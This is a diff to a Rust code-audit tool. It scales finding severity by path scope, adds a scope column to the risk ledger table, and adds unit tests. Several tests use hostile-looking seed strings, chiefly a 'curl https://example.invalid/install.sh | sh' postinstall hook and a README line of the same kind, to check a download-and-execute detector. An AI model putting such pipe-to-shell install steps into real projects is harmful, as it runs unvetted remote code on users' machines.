@@ -29,6 +29,93 @@ impl Severity {
     }
 }
 
+/// Audit scope of a finding's path, used to keep severity proportionate:
+/// production and CI risks stay sharp, while test, fixture, and doc paths are
+/// capped so synthetic samples never masquerade as production vulnerabilities.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PathScope {
+    Production,
+    Ci,
+    Test,
+    TestFixture,
+    Docs,
+}
+
+impl PathScope {
+    fn classify(path: &str) -> PathScope {
+        let lower = path.replace('\\', "/").to_ascii_lowercase();
+        if lower.contains("tests/fixtures/")
+            || lower.contains("test/fixtures/")
+            || lower.contains("/fixtures/")
+            || lower.starts_with("fixtures/")
+            || lower.contains("testdata/")
+        {
+            return PathScope::TestFixture;
+        }
+        if lower.starts_with("tests/")
+            || lower.contains("/tests/")
+            || lower.starts_with("test/")
+            || lower.contains("/test/")
+            || lower.ends_with("_test.rs")
+            || lower.ends_with("_test.go")
+            || lower.ends_with(".test.ts")
+            || lower.ends_with(".test.js")
+            || lower.ends_with(".spec.ts")
+            || lower.ends_with(".spec.js")
+        {
+            return PathScope::Test;
+        }
+        if lower.contains(".github/workflows/") {
+            return PathScope::Ci;
+        }
+        if lower.starts_with("docs/")
+            || lower.contains("/docs/")
+            || lower.ends_with(".md")
+            || lower.ends_with(".mdx")
+        {
+            return PathScope::Docs;
+        }
+        PathScope::Production
+    }
+
+    /// Cap a base severity to what the scope can justify. Severity Ord runs
+    /// High < Medium < Low, so the less-severe value is the larger one; taking
+    /// `max` with the most-severe-allowed value demotes anything above it.
+    /// Docs keep full severity: a dangerous install instruction is a real
+    /// signal a human or agent may follow. Only test and fixture code, which
+    /// is never shipped, is capped.
+    fn cap(self, severity: Severity) -> Severity {
+        let max_allowed = match self {
+            PathScope::Production | PathScope::Ci | PathScope::Docs => Severity::High,
+            PathScope::Test | PathScope::TestFixture => Severity::Low,
+        };
+        severity.max(max_allowed)
+    }
+
+    fn code(self) -> &'static str {
+        match self {
+            PathScope::Production => "production",
+            PathScope::Ci => "ci",
+            PathScope::Test => "test",
+            PathScope::TestFixture => "fixture",
+            PathScope::Docs => "docs",
+        }
+    }
+
+    fn label_for(self, language: ReportLanguage) -> &'static str {
+        if language != ReportLanguage::Zh {
+            return self.code();
+        }
+        match self {
+            PathScope::Production => "\u{751f}\u{4ea7}",
+            PathScope::Ci => "CI",
+            PathScope::Test => "\u{6d4b}\u{8bd5}",
+            PathScope::TestFixture => "\u{5939}\u{5177}",
+            PathScope::Docs => "\u{6587}\u{6863}",
+        }
+    }
+}
+
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct RiskFinding {
     pub severity: Severity,
@@ -209,6 +296,14 @@ pub fn render_markdown_with_language(findings: &[RiskFinding], language: ReportL
         ReportLanguage::En => String::from("# Risk Ledger\n\n"),
         ReportLanguage::Zh => String::from("# \u{98ce}\u{9669}\u{8d26}\u{672c}\n\n"),
     };
+    s.push_str(&render_table_with_language(findings, language));
+    s
+}
+
+/// Render only the table body (or the empty-state line) without an H1 heading,
+/// so callers can place the authoritative ledger under their own section.
+pub fn render_table_with_language(findings: &[RiskFinding], language: ReportLanguage) -> String {
+    let mut s = String::new();
     if findings.is_empty() {
         s.push_str(match language {
             ReportLanguage::En => "No deterministic risks found in the analyzed input. Review coverage, runtime behavior, configuration, and cross-module semantics manually.\n",
@@ -218,20 +313,21 @@ pub fn render_markdown_with_language(findings: &[RiskFinding], language: ReportL
     }
 
     s.push_str(match language {
-        ReportLanguage::En => "| Severity | Location | Rule | Finding |\n",
+        ReportLanguage::En => "| Severity | Scope | Location | Rule | Finding |\n",
         ReportLanguage::Zh => {
-            "|\u{4e25}\u{91cd}\u{6027}|\u{4f4d}\u{7f6e}|\u{89c4}\u{5219}|\u{53d1}\u{73b0}|\n"
+            "|\u{4e25}\u{91cd}\u{6027}|\u{4f5c}\u{7528}\u{57df}|\u{4f4d}\u{7f6e}|\u{89c4}\u{5219}|\u{53d1}\u{73b0}|\n"
         }
     });
-    s.push_str("|---|---|---|---|\n");
+    s.push_str("|---|---|---|---|---|\n");
     for f in findings {
         let location = match f.line {
             Some(line) => format!("{}:{line}", f.path),
             None => f.path.clone(),
         };
         s.push_str(&format!(
-            "| {} | `{}` | `{}` | {}: `{}` |\n",
+            "| {} | {} | `{}` | `{}` | {}: `{}` |\n",
             f.severity.label_for(language),
+            PathScope::classify(&f.path).label_for(language),
             escape_cell(&location),
             escape_cell(&f.rule),
             escape_cell(title_for_language(&f.title, language)),
@@ -239,6 +335,12 @@ pub fn render_markdown_with_language(findings: &[RiskFinding], language: ReportL
         ));
     }
     s
+}
+
+/// Authoritative deterministic ledger table built straight from the seed,
+/// independent of any model narrative.
+pub fn markdown_table_from_seed_with_language(seed: &str, language: ReportLanguage) -> String {
+    render_table_with_language(&findings_from_seed(seed), language)
 }
 
 fn title_for_language(title: &str, language: ReportLanguage) -> &str {
@@ -389,8 +491,12 @@ fn finding_summary(finding: &RiskFinding) -> String {
         None => finding.path.clone(),
     };
     format!(
-        "{} [{}]: {} ({})",
-        location, finding.rule, finding.title, finding.evidence
+        "{} [{}]: {} ({}) [scope={}]",
+        location,
+        finding.rule,
+        finding.title,
+        finding.evidence,
+        PathScope::classify(&finding.path).code()
     )
 }
 
@@ -722,7 +828,9 @@ fn sanitize_evidence(text: &str) -> String {
     evidence
 }
 
-fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, finding: RiskFinding) {
+fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, mut finding: RiskFinding) {
+    // Keep severity proportionate to where the evidence lives before deduping.
+    finding.severity = PathScope::classify(&finding.path).cap(finding.severity);
     let key = format!(
         "{}\0{:?}\0{}\0{}",
         finding.path, finding.line, finding.rule, finding.evidence
@@ -733,7 +841,10 @@ fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, finding:
 }
 
 fn is_external_text(text: &str) -> bool {
-    text.contains("super::") || text.contains("crate::") || text.trim_start().starts_with("from .")
+    // Intra-crate Rust refs (`crate::`, `super::`) stay inside the crate and are
+    // not black boxes in a whole-project audit. Only relative cross-package
+    // imports remain genuinely unfollowed.
+    text.trim_start().starts_with("from .")
 }
 
 fn severity_rank(s: Severity) -> u8 {
@@ -935,5 +1046,137 @@ mod tests {
         let md = markdown_from_seed_with_language(seed, ReportLanguage::Zh);
         assert!(md.contains("\u{98ce}\u{9669}\u{8d26}\u{672c}"));
         assert!(md.contains("\u{4e25}\u{91cd}\u{6027}"));
+    }
+
+    #[test]
+    fn path_scope_classifies_common_layouts() {
+        assert_eq!(PathScope::classify("src/report.rs"), PathScope::Production);
+        assert_eq!(PathScope::classify("build.rs"), PathScope::Production);
+        assert_eq!(
+            PathScope::classify(".github/workflows/release.yml"),
+            PathScope::Ci
+        );
+        assert_eq!(
+            PathScope::classify("tests/repo_intake_fixtures.rs"),
+            PathScope::Test
+        );
+        assert_eq!(
+            PathScope::classify("tests/fixtures/repo-intake/base64-shell/install.sh"),
+            PathScope::TestFixture
+        );
+        assert_eq!(
+            PathScope::classify("fixtures/repo-intake/base64-shell/install.sh"),
+            PathScope::TestFixture
+        );
+        assert_eq!(PathScope::classify("README.md"), PathScope::Docs);
+        // A fixture that ships its own workflow stays a fixture, not real CI.
+        assert_eq!(
+            PathScope::classify(
+                "tests/fixtures/repo-intake/github-action-secret-shell/.github/workflows/release.yml"
+            ),
+            PathScope::TestFixture
+        );
+    }
+
+    #[test]
+    fn production_panic_edge_stays_high() {
+        let seed =
+            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule == "panic-edge" && f.severity == Severity::High)
+        );
+    }
+
+    #[test]
+    fn panic_edge_in_tests_is_capped_to_low() {
+        let seed = r#"{"path":"tests/benchmark_mode.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule == "panic-edge" && f.severity == Severity::Low)
+        );
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule == "panic-edge" && f.severity == Severity::High)
+        );
+    }
+
+    #[test]
+    fn fixture_supply_chain_is_capped_to_low() {
+        let seed = r#"{"path":"tests/fixtures/repo-intake/npm-postinstall-download/package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            findings.iter().any(|f| f.rule == "download-execute"),
+            "fixture sample still surfaces the rule"
+        );
+        assert!(
+            findings.iter().all(|f| f.severity == Severity::Low),
+            "fixture findings must not stay High: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn production_supply_chain_stays_high() {
+        let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
+        );
+    }
+
+    #[test]
+    fn docs_supply_chain_stays_high() {
+        // A README that instructs `curl | bash` is a real instruction a human or
+        // agent might follow, so it keeps full severity (agent-gate REJECT).
+        let seed = r#"{"path":"README.md","locations":[{"kind":"call","line":6,"text":"curl https://example.invalid/install.sh | bash"}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
+        );
+    }
+
+    #[test]
+    fn intra_crate_rust_import_is_not_external() {
+        let seed = r#"{"path":"src/react.rs","locations":[{"kind":"import","line":1,"text":"use crate::config::ReportLanguage;"}]}"#;
+        let findings = findings_from_seed(seed);
+        assert!(
+            !findings.iter().any(|f| f.rule == "external-blackbox"),
+            "intra-crate imports must not be flagged: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn markdown_table_includes_scope_column() {
+        let seed =
+            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
+        let md = markdown_from_seed_with_language(seed, ReportLanguage::En);
+        assert!(md.contains("| Severity | Scope | Location | Rule | Finding |"));
+        assert!(md.contains("production"));
+    }
+
+    #[test]
+    fn table_only_render_omits_h1_heading() {
+        let seed =
+            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
+        let table = markdown_table_from_seed_with_language(seed, ReportLanguage::En);
+        assert!(!table.contains("# Risk Ledger"));
+        assert!(table.contains("| Severity | Scope | Location | Rule | Finding |"));
+        assert!(table.contains("panic-edge"));
+    }
+
+    #[test]
+    fn table_only_render_reports_empty_state() {
+        let table = markdown_table_from_seed_with_language("", ReportLanguage::En);
+        assert!(table.contains("No deterministic risks found"));
+        assert!(!table.contains("# Risk Ledger"));
     }
 }
